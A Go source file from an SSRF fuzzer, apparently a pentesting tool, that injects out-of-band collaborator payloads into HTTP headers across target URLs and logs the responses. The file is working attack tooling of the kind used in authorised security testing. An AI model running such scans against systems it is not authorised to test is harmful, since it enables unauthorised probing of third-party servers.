// Package lib implements the scanning phases for the ressrf SSRF fuzzer. Each phase
// targets a different injection surface: HTTP headers, URL parameters, and protocol-bypass
// payloads. All phases schedule work onto a shared job queue and report results through a
// common activity-logging callback.
package lib

import (
	"fmt"
	"sync"

	"github.com/R0X4R/ressrf/pkg"
)

// ExecuteHeaderPhase enqueues header-injection jobs for each target URL and header vector using both payload formats (with and without an HTTP scheme).
//
// For each generated payload an identifier is allocated (incrementing trackCounter) and corresponding metadata is stored in requestTracker. Each job, when executed, will wait on rl, set the specified header to the payload, send the request, and invoke logActivity with either "ERROR" (on send failure) or "SENT" (on success) including the target URL, status code, and a short detail string.
//
// ExecuteHeaderPhase schedules work onto the provided jobs channel and increments wg for each scheduled job; it does not block waiting for job completion.
func ExecuteHeaderPhase(
	urls []string,
	collab string,
	rl *pkg.RateLimiter,
	jobs chan<- func(),
	wg *sync.WaitGroup,
	trackMutex *sync.Mutex,
	trackCounter *int,
	requestTracker map[string]pkg.VulnerabilityMetadata,
	logActivity func(string, string, int, string),
) {
	for _, rawURL := range urls {
		for _, header := range pkg.HeadersInject {
			for _, useScheme := range []bool{false, true} {
				trackMutex.Lock()
				*trackCounter++
				id := fmt.Sprintf("idx%d", *trackCounter)

				collabPayload := id + "." + collab
				if useScheme {
					collabPayload = "http://" + collabPayload
				}

				u, h, p := rawURL, header, collabPayload
				requestTracker[id] = pkg.VulnerabilityMetadata{
					BaseURL:    rawURL,
					InjectType: "Header Injection",
					HeaderName: h,
				}
				trackMutex.Unlock()

				wg.Add(1)
				func(targetURL, hdrKey, payloadStr string) {
					jobs <- func() {
						defer wg.Done()
						rl.Wait()
						hdrs := pkg.BaseHeaders()
						hdrs[hdrKey] = payloadStr
						status, _, err := pkg.SendRequest(targetURL, hdrs)
						if err != nil {

							logActivity("ERROR", targetURL, 0, fmt.Sprintf("Header Key [%s] - %s", hdrKey, err.Error()))
							return
						}

						logActivity("SENT", targetURL, status, fmt.Sprintf("Header Vector [%s]", hdrKey))
					}
				}(u, h, p)
			}
		}
	}
}
